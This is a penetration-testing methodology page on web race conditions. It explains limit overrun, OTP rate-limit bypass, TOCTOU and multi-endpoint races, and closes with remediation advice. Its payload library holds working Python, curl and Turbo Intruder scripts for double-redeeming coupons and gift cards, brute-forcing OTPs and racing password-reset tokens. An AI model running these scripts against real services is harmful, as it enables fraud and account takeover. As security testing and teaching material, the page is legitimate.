---
title: "Race Conditions"
date: 2026-02-24
draft: false
---

# Race Conditions

> **Severity**: High–Critical | **CWE**: CWE-362
> **OWASP**: A04:2021 – Insecure Design

---

## What Are Race Conditions?

Race conditions in web apps occur when **multiple concurrent requests** interact with shared state before that state is properly updated. The classic pattern: read-check-act without atomicity.

```
Thread A: READ balance=100 → CHECK balance>50? YES → [gap] → WRITE balance=50
Thread B:                                              READ balance=100 → CHECK balance>100? YES → WRITE balance=0
→ Both succeed, but total withdrawn = 150 from 100 balance (TOCTOU)
```

**Modern web race conditions** (PortSwigger research):
- **Limit overrun** — bypass single-use discount codes, one-redemption-per-user limits
- **Rate limit bypass** — bypass OTP brute-force protections
- **Partial construction** — exploit state between object creation and initialization
- **Time-of-check to time-of-use (TOCTOU)** — file operations, session state
- **Multi-endpoint** — state collision across different endpoints sharing resources

---

## Discovery Checklist

- [ ] Identify single-use tokens/codes (discount, promo, invite, OTP, gift card)
- [ ] Identify "check then act" patterns (balance check, limit check, stock check)
- [ ] Identify idempotency issues — what happens if same request sent 2x simultaneously?
- [ ] Test coupon/voucher codes — apply twice in parallel
- [ ] Test password reset tokens — use once, then immediately again
- [ ] Test rate-limited endpoints — OTP, login, API calls
- [ ] Test file upload + processing pipeline (TOCTOU between upload and scan)
- [ ] Use Burp Suite's "Send Group in Parallel" for H1 race
- [ ] Use HTTP/2 single-packet attack for H2 race (all requests in one TCP packet)
- [ ] Test multi-step flows: step 1 + step 1 simultaneously (skip step 2)
- [ ] Check for token reuse windows (short TTL tokens that reset server-side state slowly)

---

## Payload Library

### Attack 1 — Limit Overrun (Classic Race)

```python
# Python: concurrent requests to redeem single-use code
import threading
import requests

TARGET = "https://target.com/api/redeem-coupon"
COUPON = "SAVE50"
SESSION_COOKIE = "session=YOUR_VALID_SESSION"

def redeem():
    r = requests.post(TARGET,
        json={"coupon": COUPON},
        headers={"Cookie": SESSION_COOKIE})
    print(r.status_code, r.text[:100])

# Launch 20 simultaneous requests:
threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

```bash
# Using curl with background jobs:
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/redeem \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALUE" \
    -d '{"code":"DISCOUNT50"}' &
done
wait
```

### Attack 2 — HTTP/2 Single-Packet Attack (Best Technique)

HTTP/2 multiplexes multiple requests in a **single TCP packet**. All arrive at the server simultaneously — no network jitter, maximum collision probability.

```python
# Python with h2 library — single-packet multi-request:
# pip3 install h2 httpx[http2]

import httpx
import asyncio

async def race_h2():
    async with httpx.AsyncClient(http2=True) as client:
        # Prepare all requests
        tasks = []
        for i in range(20):
            tasks.append(
                client.post(
                    "https://target.com/api/redeem",
                    json={"code": "PROMO50"},
                    cookies={"session": "VALID_SESSION"}
                )
            )
        # Launch all simultaneously (h2 single-packet):
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status_code, r.text[:80])

asyncio.run(race_h2())
```

```python
# turbo-intruder (Burp extension) — single-packet attack script:
# Turbo Intruder → select request → Scripts → Race (single-packet)

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # Queue 20 identical requests:
    for i in range(20):
        engine.queue(target.req, gate='race')
    # Release all at once (single-packet):
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### Attack 3 — Last-Byte Sync (HTTP/1.1 Race)

When HTTP/2 is unavailable, send all request bodies except the last byte, then send final bytes simultaneously — all requests complete processing at the same time.

```python
# Python last-byte synchronization:
import socket
import threading
import time

def send_with_last_byte_sync(host, port, request_prefix, last_chunk, num):
    """Send request headers + body except last byte, then sync final byte"""
    sockets = []
    for _ in range(num):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(request_prefix.encode())  # headers + partial body
        sockets.append(s)

    # Tiny delay to ensure all connections are ready:
    time.sleep(0.05)

    # Send last byte on all connections simultaneously:
    for s in sockets:
        s.send(last_chunk.encode())

    # Read responses:
    for s in sockets:
        response = s.recv(4096).decode()
        print(response[:200])
        s.close()
```

### Attack 4 — Rate Limit / OTP Bypass

```python
# Brute-force OTP within the race window:
# If rate limit is enforced per-session but not per-concurrent-request:

import httpx
import asyncio

OTP_CODES = [f"{i:06d}" for i in range(1000)]  # test range

async def test_otp(client, code):
    r = await client.post("https://target.com/verify-otp",
        json={"otp": code},
        cookies={"session": "SESSION"})
    if "success" in r.text or r.status_code == 200:
        print(f"[VALID] OTP: {code}")
    return r

async def race_otp():
    async with httpx.AsyncClient(http2=True) as client:
        # Send burst of OTP guesses simultaneously:
        tasks = [test_otp(client, code) for code in OTP_CODES[:50]]
        await asyncio.gather(*tasks)

asyncio.run(race_otp())
```

```bash
# Turbo Intruder for OTP race:
# Load 6-digit OTP wordlist
# Use single-packet attack gate
# Monitor for different response length/status
```

### Attack 5 — Password Reset Token Race

```bash
# Request multiple password reset tokens simultaneously:
# If server invalidates old token on new request → race for valid window

for i in $(seq 1 10); do
  curl -s -X POST https://target.com/reset-password \
    -d "email=victim@corp.com" &
done
wait
# → Multiple valid tokens may be generated before invalidation logic runs
# → Use captured tokens from email (if you have access) or OOB

# TOCTOU on password reset flow:
# Step 1: Request reset for victim account
# Step 2: Simultaneously: use reset token + change email
# → If email change and token use checked separately without locking:
# → Token valid for original email, but account email already changed
```

### Attack 6 — Multi-Endpoint Race (Parallel State Confusion)

```python
# Attack: simultaneously trigger two operations that share state
# Example: transfer + delete-account, or verify-email + change-email

import httpx
import asyncio

async def race_multi_endpoint():
    async with httpx.AsyncClient(http2=True) as client:
        cookies = {"session": "VALID_SESSION"}

        # Endpoint 1: apply discount (checks if already used)
        req1 = client.post("https://target.com/apply-discount",
            json={"code": "ONCE_ONLY"}, cookies=cookies)

        # Endpoint 2: checkout (reads discount from session)
        req2 = client.post("https://target.com/checkout",
            json={"items": ["item123"]}, cookies=cookies)

        # Race both endpoints:
        r1, r2 = await asyncio.gather(req1, req2)
        print("Discount:", r1.status_code, r1.text[:100])
        print("Checkout:", r2.status_code, r2.text[:100])

asyncio.run(race_multi_endpoint())
```

### Attack 7 — Gift Card / Wallet Race

```bash
# Classic race: redeem gift card, check balance, redeem again

# Step 1: find balance check endpoint
GET /api/wallet/balance → {"balance": 50}

# Step 2: race redemption endpoint:
python3 -c "
import threading, requests

def redeem():
    r = requests.post('https://target.com/api/gift-card/redeem',
        json={'card': 'GIFT-CARD-CODE'},
        cookies={'session': 'SESSION'})
    print(r.json())

threads = [threading.Thread(target=redeem) for _ in range(15)]
[t.start() for t in threads]
[t.join() for t in threads]
"
```

---

## Tools

```bash
# Burp Suite:
# - Repeater → "Send group in parallel" (HTTP/2 single-packet mode)
# - Turbo Intruder extension (BApp Store) — best for race conditions
#   - Use "race-single-packet-attack.py" template
#   - Configurable concurrency + gate-based synchronization
# - Logger++ for comparing parallel responses

# httpx (Python async HTTP/2):
pip3 install httpx[http2]

# racepwn:
git clone https://github.com/nicowillis/racepwn

# Custom timing script — measure response time variance:
for i in $(seq 1 100); do
  time curl -s -o /dev/null https://target.com/api/check-code \
    -d "code=TEST" 2>&1 | grep real
done

# Repeater parallel group (Burp):
# Create request group → right-click tab → Add to group
# Send group → "Send group in parallel"
# Switch to HTTP/2 in connection settings for single-packet

# ffuf with rate limiting bypass test:
ffuf -u https://target.com/api/verify-otp -X POST \
  -d '{"otp":"FUZZ"}' \
  -H "Content-Type: application/json" \
  -b "session=SESSION" \
  -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt \
  -rate 1000 -t 100
```

---

## Remediation Reference

- **Atomic operations**: use DB-level atomic increments/decrements (`UPDATE ... WHERE stock > 0 AND id = ?`)
- **Database transactions** with proper isolation level (`SERIALIZABLE` for critical operations)
- **Redis INCR/DECR** — atomic counter operations for rate limiting and use-counts
- **Idempotency keys**: generate server-side before showing to user, invalidate on first use
- **Pessimistic locking**: `SELECT FOR UPDATE` on the row before modifying
- **Optimistic locking**: version field — reject update if version mismatch detected
- **Per-user distributed locks** (Redis SETNX with TTL) for critical single-use operations
- **Avoid TOCTOU**: move from check-then-act to compare-and-swap (CAS) patterns

*Part of the Web Application Penetration Testing Methodology series.*
